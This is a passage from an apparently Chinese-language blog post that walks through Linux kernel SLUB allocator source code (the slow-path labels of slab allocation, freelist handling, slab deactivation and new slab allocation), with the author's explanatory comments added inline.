reread_slab</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">reread_slab:<br><br>slab = READ_ONCE(c-&gt;slab); <span class="hljs-comment">//首先再次获取依次目前cpu上的slab指针</span><br><span class="hljs-keyword">if</span> (!slab) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 如果节点不在线或者没有正常内存，则忽略节点约束</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;<br>     !node_isset(node, slab_nodes)))<br>node = NUMA_NO_NODE;<br><span class="hljs-keyword">goto</span> new_slab; <span class="hljs-comment">//跳转到new_slab标签</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="two-redo"><a href="#two-redo" class="headerlink" title=":two:redo"></a>:two:redo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * 运行到这里说明在上面获取cpu的slab时他不为空，</span><br><span class="hljs-comment"> * 这里我目前推测是因为切换cpu后重新或取的当前struct kmem_cache_cpu下的slab</span><br><span class="hljs-comment"> */</span><br>redo:<br><br><span class="hljs-keyword">if</span> (unlikely(!node_match(slab, node))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 与上面相同，但 node_match() 为 false 已经意味着 node != NUMA_NO_NODE</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!node_isset(node, slab_nodes)) &#123; <span class="hljs-comment">//查看是否与对应标识为匹配，若匹配则设置node = NUMA_NO_NODE</span><br>node = NUMA_NO_NODE;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//否则跳转到下一标签</span><br>stat(s, ALLOC_NODE_MISMATCH);<br><span class="hljs-keyword">goto</span> deactivate_slab;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 按理说，我们应该搜索 PFMEMALLOC 的页面，</span><br><span class="hljs-comment"> * 但现在，当页面离开per_cpu 分配器时，我们正在丢失 pfmemalloc 信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))<br><span class="hljs-keyword">goto</span> deactivate_slab;<br><br><span class="hljs-comment">/* 必须再次检查 c-&gt;slab 以防我们被抢占并且它发生了变化 */</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags); <span class="hljs-comment">//锁住了，免得切换cpu</span><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags); <span class="hljs-comment">//若发现切换了，则我们解锁了重新回到reread_slab标签</span><br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist; <span class="hljs-comment">//到这里说明还没切换cpu，所以这里获取cpu的freelist</span><br><span class="hljs-keyword">if</span> (freelist) <span class="hljs-comment">//若存在per_cpu-&gt;freelist，则跳转到load_freelist标签</span><br><span class="hljs-keyword">goto</span> load_freelist;<br><br>freelist = get_freelist(s, slab); <span class="hljs-comment">//否则调用该函数，传入kmem_cache和slab来获取slab-&gt;freelist</span><br><br><span class="hljs-keyword">if</span> (!freelist) &#123; <span class="hljs-comment">//若仍获取不到空闲freelist</span><br>c-&gt;slab = <span class="hljs-literal">NULL</span>; <br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, DEACTIVATE_BYPASS);<br><span class="hljs-keyword">goto</span> new_slab; <span class="hljs-comment">//跳转到new_slab标签</span><br>&#125;<br><br>stat(s, ALLOC_REFILL);<br><br></code></pre></td></tr></table></figure><p>这里的一个get_freelist函数是将当前cpu的slab-&gt;free_list返回，或者停用该slab</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 检查slab-&gt;freelist，并将空闲列表转移到per_CPU的空闲列表或停用该slab。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 如果返回值不为 NULL，slab 仍会被冻结。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 如果此函数返回 NULL，则该slab已被解冻</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_freelist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-type">void</span> *freelist;<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock)); <br><br><span class="hljs-keyword">do</span> &#123;<br>freelist = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br><br>new.counters = counters;<br>VM_BUG_ON(!new.frozen);<br><br>new.inuse = slab-&gt;objects;<br>new.frozen = freelist != <span class="hljs-literal">NULL</span>;<br><br>&#125; <span class="hljs-keyword">while</span> (!__cmpxchg_double_slab(s, slab,<br>freelist, counters,<br><span class="hljs-literal">NULL</span>, new.counters,<br><span class="hljs-string">&quot;get_freelist&quot;</span>));<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="three-load-freelist"><a href="#three-load-freelist" class="headerlink" title=":three:load_freelist"></a>:three:load_freelist</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">load_freelist:<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * freelist指向要使用的对象列表。 </span><br><span class="hljs-comment"> * slab指向从中获取对象的slab。 </span><br><span class="hljs-comment"> * 该slab 必须被冻结才能让per_CPU 分配工作。</span><br><span class="hljs-comment"> */</span><br>VM_BUG_ON(!c-&gt;slab-&gt;frozen);<br>c-&gt;freelist = get_freepointer(s, freelist); <span class="hljs-comment">//获取freelist指向的object的下一块object，并且设置他</span><br>c-&gt;tid = next_tid(c-&gt;tid); <span class="hljs-comment">//设置tid</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags); <br><span class="hljs-keyword">return</span> freelist;<br></code></pre></td></tr></table></figure><p>这里的<code>get_freepointer</code>函数最终会调用下面这个<code>freelist_ptr</code>，且参数为本<code>kmem_cache</code>和当前object指向的下一个object的地址，如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 返回空闲列表指针 (ptr)。</span><br><span class="hljs-comment"> * 通过强化，可以通过指针所在地址和每个缓存随机数的异或来进行混淆。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span></span><br><span class="hljs-params"><span class="hljs-function"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当 CONFIG_KASAN_SW/HW_TAGS 启用时，ptr_addr 可能会被标记.</span><br><span class="hljs-comment">     * 通常，这不会导致任何问题，因为 set_freepointer() 和 get_freepointer() 都是使用具有相同标记的指针调用的。</span><br><span class="hljs-comment">     * 但是，CONFIG_SLUB_DEBUG 代码存在一些问题。 </span><br><span class="hljs-comment">     * 例如，当 __free_slub() 迭代缓存中的对象时，它将未标记的指针传递给 check_object()。 </span><br><span class="hljs-comment">     * check_object() 又用一个未标记的指针调用 get_freepointer()，这会导致 freepointer 被错误地恢复。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br><span class="hljs-built_in">swab</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)<span class="hljs-built_in">kasan_reset_tag</span>((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>一般如果我们运行到这里就可以返回一个空闲object了，但是本函数代码还并未结束</p><h4 id="four-deactivate-slab"><a href="#four-deactivate-slab" class="headerlink" title=":four:deactivate_slab"></a>:four:deactivate_slab</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">deactivate_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (slab != c-&gt;slab) &#123;     <span class="hljs-comment">//同步检查</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab; <span class="hljs-comment">//若中间切换了CPU，则跳转到reread_slab</span><br>&#125;<br>freelist = c-&gt;freelist;  <span class="hljs-comment">//保存第一个object指针</span><br>c-&gt;slab = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//设置当前kmem_cache_cpu字段为NULL，且tid转换</span><br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>deactivate_slab(s, slab, freelist); <span class="hljs-comment">//激活该slab</span><br><br></code></pre></td></tr></table></figure><p>下面介绍以下激活函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 完成移除 cpu slab。 </span><br><span class="hljs-comment"> * 将cpu的空闲列表与slab的空闲列表合并，解冻slab并将其放入正确的列表中。 </span><br><span class="hljs-comment"> * 假设该slab已经被调用者安全地从kmem_cache_cpu中取出。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">deactivate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *freelist)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> get_node(s, slab_nid(slab));<br><span class="hljs-type">int</span> free_delta = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> <span class="hljs-title">mode</span> =</span> M_NONE;<br><span class="hljs-type">void</span> *nextfree, *freelist_iter, *freelist_tail;<br><span class="hljs-type">int</span> tail = DEACTIVATE_TO_HEAD;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">old</span>;</span><br><br><span class="hljs-keyword">if</span> (slab-&gt;freelist) &#123;<br>stat(s, DEACTIVATE_REMOTE_FREES);<br>tail = DEACTIVATE_TO_TAIL;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 第一阶段：将cpu的freelist上的对象统计为free_delta，并记住freelist_tail中的最后一个对象，以供后续拼接。</span><br><span class="hljs-comment"> */</span><br>freelist_tail = <span class="hljs-literal">NULL</span>;<br>freelist_iter = freelist;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 将freelist剩下的破损部分给截掉</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">while</span> (freelist_iter) &#123;<br>nextfree = get_freepointer(s, freelist_iter); <br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 如果“nextfree”无效，则“freelist_iter”处的对象可能已经损坏。 </span><br><span class="hljs-comment"> * 因此，通过跳过从“freelist_iter”开始的所有对象来隔离它们</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))<br><span class="hljs-keyword">break</span>;<br><br>freelist_tail = freelist_iter;<br>free_delta++;<br><br>freelist_iter = nextfree;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 第二阶段：解冻slab，同时将per-cpu的空闲列表拼接到slab的空闲列表的头部。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 确保slab已解冻，而列表的存在反映了解冻期间对象的实际数量。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们首先执行 cmpxchg 持有锁，并在成功时插入列表。 </span><br><span class="hljs-comment"> * 如果存在不匹配，则slab不会解冻，并且slab中的对象数量可能已更改。 </span><br><span class="hljs-comment"> * 然后释放锁定并再次重试 cmpxchg。</span><br><span class="hljs-comment"> */</span><br>redo:<br><br>old.freelist = READ_ONCE(slab-&gt;freelist);<br>old.counters = READ_ONCE(slab-&gt;counters);<br>VM_BUG_ON(!old.frozen);<br><br><span class="hljs-comment">/* 确定slab的目标状态 */</span><br>new.counters = old.counters;<br><span class="hljs-keyword">if</span> (freelist_tail) &#123;<br>new.inuse -= free_delta;<br>set_freepointer(s, freelist_tail, old.freelist);<br>new.freelist = freelist;<br>&#125; <span class="hljs-keyword">else</span><br>new.freelist = old.freelist;<br><br>new.frozen = <span class="hljs-number">0</span>; <span class="hljs-comment">//frozen设为0来标识解冻</span><br><br><span class="hljs-keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123; <span class="hljs-comment">//如果说激活slab的已被使用的块数量为0且partial块数量大于最小partial块数量</span><br>mode = M_FREE; <span class="hljs-comment">//则设置该mode来在之后的流程中释放它</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.freelist) &#123;<br>mode = M_PARTIAL; <span class="hljs-comment">//反之若存在空闲对象，则可以设置该mode来将其添加到partial链表当中</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 使用自旋锁消除了 acquire_slab() 看到被冻结的平板的可能性</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mode = M_FULL_NOLIST;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!cmpxchg_double_slab(s, slab,<br>old.freelist, old.counters,<br>new.freelist, new.counters,<br><span class="hljs-string">&quot;unfreezing slab&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (mode == M_PARTIAL)<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (mode == M_PARTIAL) &#123;<br>add_partial(n, slab, tail);<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, tail);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FREE) &#123;<br>stat(s, DEACTIVATE_EMPTY);<br>discard_slab(s, slab);<br>stat(s, FREE_SLAB);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FULL_NOLIST) &#123;<br>stat(s, DEACTIVATE_FULL);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="five-new-slab"><a href="#five-new-slab" class="headerlink" title=":five:new_slab"></a>:five:new_slab</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">new_slab:<br><br><span class="hljs-keyword">if</span> (slub_percpu_partial(c)) &#123; <span class="hljs-comment">//如果有部分链表</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123; <span class="hljs-comment">//若c-&gt;slab非空，这里说明切换了cpu，所以回到前面重新读</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123; <span class="hljs-comment">//同样这里再检测一遍，没有则说明</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-comment">/* we were preempted and partial list got empty */</span><br><span class="hljs-keyword">goto</span> new_objects;<br>&#125;<br><br>slab = c-&gt;slab = slub_percpu_partial(c); <span class="hljs-comment">//将partial指向的slab返回给c-&gt;slab</span><br>slub_set_percpu_partial(c, slab); <span class="hljs-comment">//将partial链条的下一个slab作为partial头返回</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, CPU_PARTIAL_ALLOC);<br><span class="hljs-keyword">goto</span> redo; <span class="hljs-comment">//跳转到redo标签</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="six-new-object"><a href="#six-new-object" class="headerlink" title=":six:new_object"></a>:six:new_object</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 走到这里说明没有partial链表了</span><br><span class="hljs-comment"> */</span><br>new_objects:<br><br>pc.flags = gfpflags;<br>pc.slab = &amp;slab;<br>pc.orig_size = orig_size;<br>freelist = get_partial(s, node, &amp;pc); <span class="hljs-comment">//调用get_partial，这里会从kmem_cache_node中的partial链表来获取slab</span><br><span class="hljs-keyword">if</span> (freelist) <span class="hljs-comment">//如果获取成功，则直接去到 check_new_slab标签</span><br><span class="hljs-keyword">goto</span> check_new_slab;<br><br>slub_put_cpu_ptr(s-&gt;cpu_slab); <br>slab = new_slab(s, gfpflags, node); <span class="hljs-comment">//该函数最终会调用到allocate_slab,使用伙伴系统来分配slab</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>slab_out_of_memory(s, gfpflags, node);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>stat(s, ALLOC_SLAB);<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123; <span class="hljs-comment">//若设置了相应标志位</span><br>freelist = alloc_single_from_new_slab(s, slab, orig_size); <span class="hljs-comment">//这里直接从slab中获取object</span><br><br><span class="hljs-keyword">if</span> (unlikely(!freelist))<br><span class="hljs-keyword">goto</span> new_objects;<br><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 还没有其他对该slab的引用，因此我们可以在没有 cmpxchg 的情况下自由地使用它</span><br><span class="hljs-comment"> */</span><br>freelist = slab-&gt;freelist;  <span class="hljs-comment">//将该slab的object赋给freelist，然后冻结自己</span><br>slab-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>slab-&gt;inuse = slab-&gt;objects;<br>slab-&gt;frozen = <span class="hljs-number">1</span>;<br><br>inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);<br></code></pre></td></tr></table></figure><p>这里介绍一下其中<code>struct partial_context</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 保存 get_partial() 调用链参数的结构 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> **<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">gfp_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面就是<code>allocate_slab</code>函数,也就是转到了咱们的伙伴系统分配page&#x2F;slab</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<span class="hljs-title function_">allocate_slab</span><span class="hljs-params">(<span 